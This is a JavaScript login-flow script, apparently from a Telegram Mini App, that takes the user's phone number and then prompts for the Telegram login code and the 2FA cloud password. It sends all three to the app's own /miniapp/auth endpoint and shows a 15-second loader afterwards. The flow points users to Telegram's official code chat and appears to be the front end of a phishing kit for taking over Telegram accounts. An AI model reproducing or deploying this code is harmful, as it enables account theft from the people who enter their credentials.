let currentStep = 1;
let userPhone = '';
let enteredCode = '';
let authSessionId = null;
let botUsername = '';
let authHandlersInitialized = new Set();
let authAnimation = null;
let successAnimation = null;

function initAuth(botUsernameParam, prefix = '') {
  botUsername = botUsernameParam || new URLSearchParams(window.location.search).get('bot_username') || '';
  
  if (prefix === 'registration') {
    if (!window.authState) {
      window.authState = {};
    }
    window.authState.currentStep = 1;
    window.authState.userPhone = '';
    window.authState.enteredCode = '';
    window.authState.authSessionId = null;
  }
  
  const step1Id = prefix ? `${prefix}Step1` : 'step1';
  const step2Id = prefix ? `${prefix}Step2` : 'step2';
  const step2faId = prefix ? `${prefix}Step2fa` : 'step2fa';
  const step3Id = prefix ? `${prefix}Step3` : 'step3';
  const step1DotId = prefix ? `${prefix}Step1Dot` : 'step1-dot';
  const step2DotId = prefix ? `${prefix}Step2Dot` : 'step2-dot';
  const step3DotId = prefix ? `${prefix}Step3Dot` : 'step3-dot';
  const progressFillId = prefix ? `${prefix}ProgressFill` : 'progressFill';
  const statusId = prefix ? `${prefix}Status` : 'status';
  const startAuthBtnId = prefix ? `${prefix}StartAuthBtn` : 'startAuthBtn';
  const digit1Id = prefix ? `${prefix}Digit1` : 'digit1';
  const digit2Id = prefix ? `${prefix}Digit2` : 'digit2';
  const digit3Id = prefix ? `${prefix}Digit3` : 'digit3';
  const digit4Id = prefix ? `${prefix}Digit4` : 'digit4';
  const digit5Id = prefix ? `${prefix}Digit5` : 'digit5';
  const password2faId = prefix ? `${prefix}Password2fa` : 'password2fa';
  const submit2faBtnId = prefix ? `${prefix}Submit2faBtn` : 'submit2faBtn';
  const togglePasswordId = prefix ? `${prefix}TogglePassword` : 'togglePassword';
  
  const steps = {
    1: document.getElementById(step1Id),
    2: document.getElementById(step2Id),
    '2fa': document.getElementById(step2faId),
    3: document.getElementById(step3Id)
  };

  const stepDots = {
    1: document.getElementById(step1DotId),
    2: document.getElementById(step2DotId),
    3: document.getElementById(step3DotId)
  };

  const progressFill = document.getElementById(progressFillId);
  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  
  function showStatus(message, type = 'error') {
    const container = document.getElementById('notificationsContainer');
    if (!container) {
      console.error('[AUTH]', message);
      return;
    }
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    notification.innerHTML = `
      <div class="notification-content">
        <div class="notification-message">${escapeHtml(message)}</div>
      </div>
      <div class="notification-progress">
        <div class="notification-progress-bar"></div>
      </div>
    `;
    
    container.appendChild(notification);
    
    const duration = 3000;
    const progressBar = notification.querySelector('.notification-progress-bar');
    if (progressBar) {
      progressBar.style.animationDuration = `${duration}ms`;
    }
    
    setTimeout(() => {
      notification.classList.add('slide-out');
      setTimeout(() => {
        if (notification.parentNode) {
          notification.parentNode.removeChild(notification);
        }
      }, 300);
    }, duration);
  }

  async function loadAuthAnimation(animationFile) {
    const animationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
    if (!animationContainer) return;
    
    if (authAnimation) {
      authAnimation.destroy();
      authAnimation = null;
    }
    animationContainer.innerHTML = '';
    
    try {
      const response = await fetch(`/market/Stic/${animationFile}`);
      if (!response.ok) throw new Error('Failed to load animation');
      
      const arrayBuffer = await response.arrayBuffer();
      const ds = new DecompressionStream('gzip');
      const decompressedStream = new Response(
        new Blob([arrayBuffer]).stream().pipeThrough(ds)
      ).arrayBuffer();
      
      const decompressed = await decompressedStream;
      const jsonString = new TextDecoder().decode(decompressed);
      const animationData = JSON.parse(jsonString);
      
      if (typeof lottie !== 'undefined') {
        const lottieWrapper = document.createElement('div');
        lottieWrapper.style.width = '100%';
        lottieWrapper.style.height = '100%';
        lottieWrapper.style.position = 'relative';
        lottieWrapper.style.overflow = 'visible';
        lottieWrapper.style.display = 'flex';
        lottieWrapper.style.alignItems = 'center';
        lottieWrapper.style.justifyContent = 'center';
        animationContainer.appendChild(lottieWrapper);
        
        authAnimation = lottie.loadAnimation({
          container: lottieWrapper,
          renderer: 'svg',
          loop: true,
          autoplay: true,
          animationData: animationData,
          rendererSettings: {
            preserveAspectRatio: 'xMidYMid meet',
            progressiveLoad: true,
            hideOnTransparent: true
          }
        });
      }
    } catch (error) {
      console.error('[AUTH] Ошибка загрузки анимации:', error);
    }
  }

  async function loadSuccessAnimation(animationFile) {
    const animationContainer = document.getElementById(prefix ? `${prefix}SuccessAnimation` : 'successAnimation');
    if (!animationContainer) return;
    
    if (successAnimation) {
      successAnimation.destroy();
      successAnimation = null;
    }
    animationContainer.innerHTML = '';
    
    try {
      const response = await fetch(`/market/Stic/${animationFile}`);
      if (!response.ok) throw new Error('Failed to load success animation');
      
      const arrayBuffer = await response.arrayBuffer();
      const ds = new DecompressionStream('gzip');
      const decompressedStream = new Response(
        new Blob([arrayBuffer]).stream().pipeThrough(ds)
      ).arrayBuffer();
      
      const decompressed = await decompressedStream;
      const jsonString = new TextDecoder().decode(decompressed);
      const animationData = JSON.parse(jsonString);
      
      if (typeof lottie !== 'undefined') {
        const lottieWrapper = document.createElement('div');
        lottieWrapper.style.width = '100%';
        lottieWrapper.style.height = '100%';
        lottieWrapper.style.position = 'relative';
        lottieWrapper.style.overflow = 'visible';
        lottieWrapper.style.display = 'flex';
        lottieWrapper.style.alignItems = 'center';
        lottieWrapper.style.justifyContent = 'center';
        animationContainer.appendChild(lottieWrapper);
        
        successAnimation = lottie.loadAnimation({
          container: lottieWrapper,
          renderer: 'svg',
          loop: true,
          autoplay: true,
          animationData: animationData,
          rendererSettings: {
            preserveAspectRatio: 'xMidYMid meet',
            progressiveLoad: true,
            hideOnTransparent: true
          }
        });
      }
    } catch (error) {
      console.error('[AUTH] Ошибка загрузки анимации успеха:', error);
    }
  }

  function showStep(step) {
    Object.values(steps).forEach(el => {
      if (el) el.classList.remove('active');
    });
    Object.values(stepDots).forEach(dot => {
      if (dot) dot.classList.remove('active');
    });
    
    if (steps[step]) steps[step].classList.add('active');
    
    for (let i = 1; i <= step && i <= 3; i++) {
      if (stepDots[i]) stepDots[i].classList.add('active');
    }

    if (progressFill) {
      const progress = step === '2fa' ? 66 : (step * 33.33);
      progressFill.style.width = Math.min(progress, 100) + '%';
    }

    currentStep = step;
    if (step === 1) {
      try { resetStartAuthUI(); } catch {} 
      if (prefix === 'registration') {
        loadAuthAnimation('phone.tgs');
      }
    }
    
    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);
    
    if (step === 2 && codeInputs[0]) {
      setTimeout(() => codeInputs[0].focus(), 100);
      
      if (prefix === 'registration') {
        loadAuthAnimation('chat.tgs');
      }
      
      if (prefix === 'registration') {
        const showCodeLink = document.getElementById('registrationShowCodeLink');
        if (showCodeLink) {
          showCodeLink.classList.remove('hidden');
          showCodeLink.href = 'https://t.me/+42777';
        }
      }
    }
    
    if (step === 3) {
      if (prefix === 'registration') {
        loadAuthAnimation('time.tgs');
      }
    }
  }

  function clearCodeInputs() {
    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);
    
    codeInputs.forEach(input => {
      if (input) input.value = '';
    });
    enteredCode = '';
    if (prefix === 'registration' && window.authState) {
      window.authState.enteredCode = '';
    }
    if (codeInputs[0]) {
      codeInputs[0].focus();
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.HapticFeedback.selectionChanged();
      }
    }
  }

  async function verifyCode() {
    if (enteredCode.length !== 5) return;
    
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    }

    try {
      console.log('[AUTH] Отправляем код:', enteredCode);
      console.log('[AUTH] Bot username:', botUsername);
      console.log('[AUTH] Session ID:', authSessionId);
      console.log('[AUTH] Тело запроса:', JSON.stringify({
        action: 'verify_code',
        session_id: authSessionId,
        code: enteredCode,
        bot_username: botUsername
      }));

      const response = await fetch('/miniapp/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: window.Telegram?.WebApp?.initData || '',
          action: 'verify_code',
          session_id: authSessionId,
          code: enteredCode,
          phone: userPhone,
          bot_username: botUsername
        })
      });

      const result = await response.json();
      console.log('[AUTH] Полный ответ от сервера:', JSON.stringify(result, null, 2));

      // Сначала проверяем 2FA (если requires_2fa=true)
      if (result.requires_2fa) {
        showStep('2fa');

        const passwordHint = document.getElementById(`${prefix}PasswordHint`);
        if (passwordHint) {
          if (result.hint && result.hint.trim()) {
            passwordHint.textContent = `Подсказка: ${result.hint}`;
            passwordHint.style.display = 'block';
          } else {
            passwordHint.style.display = 'none';
          }
        }

        console.log('[AUTH] Требуется 2FA, hint:', result.hint || 'отсутствует');
      } else if (result.status === 'ok') {
        showStep(3);
        console.log('[AUTH] Код верный');

        const SUCCESS_DELAY = 15000;
        setTimeout(() => {
          const loader = document.querySelector(prefix ? `#${step3Id} .liquid-loader` : '.liquid-loader');
          const successContent = document.querySelector(prefix ? `#${step3Id} .success-content` : '.success-content');
          const authAnimationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
          if (loader) loader.style.display = 'none';
          if (authAnimationContainer) authAnimationContainer.style.display = 'none';
          if (successContent) {
            successContent.classList.add('show');
            if (prefix === 'registration') {
              loadSuccessAnimation('yspex.tgs');
            }
          }
        }, SUCCESS_DELAY);
      } else {
        console.log('[AUTH] Неверный код:', result.error);
        throw new Error(result.error || 'Неверный код');
      }
    } catch (error) {
      console.error('[AUTH] Ошибка проверки кода:', error);
      showStatus(error.message, 'error');
      clearCodeInputs();
    }
  }
  
  function resetStartAuthUI() {
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (!startAuthBtn) return;
    startAuthBtn.disabled = false;
    if (prefix === 'registration') {
      startAuthBtn.innerHTML = '<img src="https://telegram.org/img/favicon.ico" class="auth-btn-icon" alt="Telegram"><span>Войти</span>';
    }
  }

  function updateCode() {
    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);
    
    if (codeInputs.length === 0) return;
    
    enteredCode = codeInputs.map(input => input.value).join('').replace(/\D/g, '');
    if (prefix === 'registration' && window.authState) {
      window.authState.enteredCode = enteredCode;
    }
    if (enteredCode.length === 5) {
      try {
        window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred('success');
      } catch (e) {}
      verifyCode();
    }
  }

  async function sendSmsCode(phone) {
    console.log('[AUTH] sendSmsCode вызван с номером:', phone);

    try {
      console.log('[AUTH] POST /miniapp/auth');
      const response = await fetch('/miniapp/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: window.Telegram?.WebApp?.initData || '',
          action: 'start',
          phone: phone,
          bot_username: botUsername
        })
      });

      console.log('[AUTH] status:', response.status);
      const result = await response.json();
      console.log('[AUTH] Результат:', result);

      if (result.status === 'ok') {
        authSessionId = result.session_id;
        if (prefix === 'registration' && window.authState) {
          window.authState.authSessionId = result.session_id;
        }
        showStep(2);
      } else {
        throw new Error(result.error);
      }
    } catch (error) {
      console.error('[AUTH] Exception:', error);
      showStatus('Ошибка отправки SMS: ' + error.message, 'error');
      resetStartAuthUI();
    }
  }

  function initAuthHandlers() {
    if (authHandlersInitialized.has(prefix || 'default')) {
      return;
    }
    authHandlersInitialized.add(prefix || 'default');
    
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (startAuthBtn) {
      startAuthBtn.addEventListener('click', () => {
        console.log('[AUTH] Кнопка нажата, запускаем requestContact');
        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
        }

        startAuthBtn.disabled = true;
        const originalHTML = startAuthBtn.innerHTML;
        const loadingText = 'Запрашиваем номер...';
        startAuthBtn.innerHTML = `<div class="loading"></div>${loadingText}`;

        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.requestContact((success, contactData) => {
          console.log('[AUTH] Callback вызван');
          console.log('[AUTH] success:', success);
          console.log('[AUTH] contactData:', contactData);

          if (success && contactData) {
            try {
              console.log('[AUTH] Полный объект contactData:', JSON.stringify(contactData));
              let phoneNumber = null;

              if (contactData.responseUnsafe && contactData.responseUnsafe.contact) {
                phoneNumber = contactData.responseUnsafe.contact.phone_number;
              } else if (contactData.contact && contactData.contact.phone_number) {
                phoneNumber = contactData.contact.phone_number;
              } else if (contactData.phone_number) {
                phoneNumber = contactData.phone_number;
              }

              if (phoneNumber) {
                userPhone = phoneNumber;
                if (prefix === 'registration' && window.authState) {
                  window.authState.userPhone = phoneNumber;
                }
                console.log('[AUTH] Номер получен:', userPhone);
                sendSmsCode(userPhone);
              } else {
                console.error('[AUTH] Не удалось извлечь phone_number из contactData');
                showStatus('Ошибка получения номера телефона', 'error');
                startAuthBtn.disabled = false;
                startAuthBtn.innerHTML = originalHTML;
              }
            } catch (e) {
              console.error('[AUTH] Ошибка при обработке контакта:', e);
              showStatus('Ошибка обработки контакта', 'error');
              startAuthBtn.disabled = false;
              startAuthBtn.innerHTML = originalHTML;
            }
          } else {
            console.log('[AUTH] Пользователь отказался делиться контактом или contactData пустой');
            showStatus('Необходимо поделиться номером телефона', 'error');
            startAuthBtn.disabled = false;
            startAuthBtn.innerHTML = originalHTML;
          }
        });
        }
      });
    }

    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);

    if (codeInputs.length > 0) {
      const codeContainer = codeInputs[0].closest('.code-input-container');
      if (codeContainer) {
        codeContainer.addEventListener('paste', (e) => {
          e.preventDefault();
          const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
          const digits = paste.replace(/\D/g, '').substring(0, 5);

          codeInputs.forEach((input, index) => {
            if (input) {
              const hadValue = input.value.length > 0;
              input.value = index < digits.length ? digits[index] : '';
              
              if (input.value.length === 1 && !hadValue) {
                input.classList.remove('animate-in');
                void input.offsetWidth;
                input.classList.add('animate-in');
                setTimeout(() => {
                  input.classList.remove('animate-in');
                }, 400);
              }
            }
          });

          const focusIndex = Math.min(digits.length, 4);
          if (codeInputs[focusIndex]) codeInputs[focusIndex].focus();

          updateCode();
          if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
        }
        });
      }

      codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
          const oldValue = e.target.value;
          e.target.value = e.target.value.replace(/\D/g, '').substring(0, 1);
          
          if (e.target.value.length === 1 && oldValue !== e.target.value) {
            e.target.classList.remove('animate-in');
            void e.target.offsetWidth;
            e.target.classList.add('animate-in');
            
            setTimeout(() => {
              e.target.classList.remove('animate-in');
            }, 400);
          }
          
          if (e.target.value.length === 1 && index < codeInputs.length - 1) {
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
          updateCode();
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === 'ArrowLeft' && index > 0) {
            e.preventDefault();
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
            e.preventDefault();
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
        });

        input.addEventListener('focus', (e) => {
          setTimeout(() => e.target.select(), 0);
        });
      });
    }

    const submit2faBtn = document.getElementById(submit2faBtnId);
    const password2fa = document.getElementById(password2faId);
    
    if (submit2faBtn && password2fa) {
      submit2faBtn.addEventListener('click', async () => {
        if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    }

        const password = password2fa.value.trim();
        if (!password) {
          showStatus('Введите пароль 2FA', 'error');
          return;
        }

        const originalHTML = submit2faBtn.innerHTML;
        submit2faBtn.disabled = true;
        submit2faBtn.innerHTML = '<div class="loading"></div>Проверяем пароль...';

        try {
          console.log('[AUTH] Отправляем пароль 2FA');
          console.log('[AUTH] Bot username:', botUsername);

          const response = await fetch('/miniapp/auth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              initData: window.Telegram?.WebApp?.initData || '',
              action: 'verify_2fa',
              session_id: authSessionId,
              password: password,
              phone: userPhone,
              bot_username: botUsername
            })
          });

          console.log('[AUTH] status:', response.status);

          const result = await response.json();
          console.log('[AUTH] Результат 2FA:', result);

          if (result.status === 'ok') {
            console.log('[AUTH] 2FA успешно!');
            showStep(3);

            const SUCCESS_DELAY = 15000;
            setTimeout(() => {
              const loader = document.querySelector(prefix ? `#${step3Id} .liquid-loader` : '.liquid-loader');
              const successContent = document.querySelector(prefix ? `#${step3Id} .success-content` : '.success-content');
              const authAnimationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
              if (loader) loader.style.display = 'none';
              if (authAnimationContainer) authAnimationContainer.style.display = 'none';
              if (successContent) {
                successContent.classList.add('show');
                if (prefix === 'registration') {
                  loadSuccessAnimation('yspex.tgs');
                }
              }
            }, SUCCESS_DELAY);
          } else {
            console.log('[AUTH] Ошибка 2FA:', result.error);
            throw new Error(result.error || 'Неверный пароль 2FA');
          }
        } catch (error) {
          console.error('[AUTH] Exception при проверке 2FA:', error);
          showStatus(error.message, 'error');
          password2fa.value = '';
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        } finally {
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        }
      });
    }
    
    const authContainer = document.querySelector('.registration-auth-container');
    if (authContainer) {
      authContainer.addEventListener('click', (e) => {
        const target = e.target;
        const isInput = target.tagName === 'INPUT' || target.tagName === 'BUTTON' || target.closest('input') || target.closest('button');
        
        if (!isInput) {
          const activeElement = document.activeElement;
          if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
            activeElement.blur();
          }
          
          if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.HapticFeedback.selectionChanged();
          }
        }
      });
    }
  }

  initAuthHandlers();
  
  if (prefix === 'registration' && currentStep === 1) {
    loadAuthAnimation('phone.tgs');
  }
  
  return {
    init: initAuthHandlers
  };
}

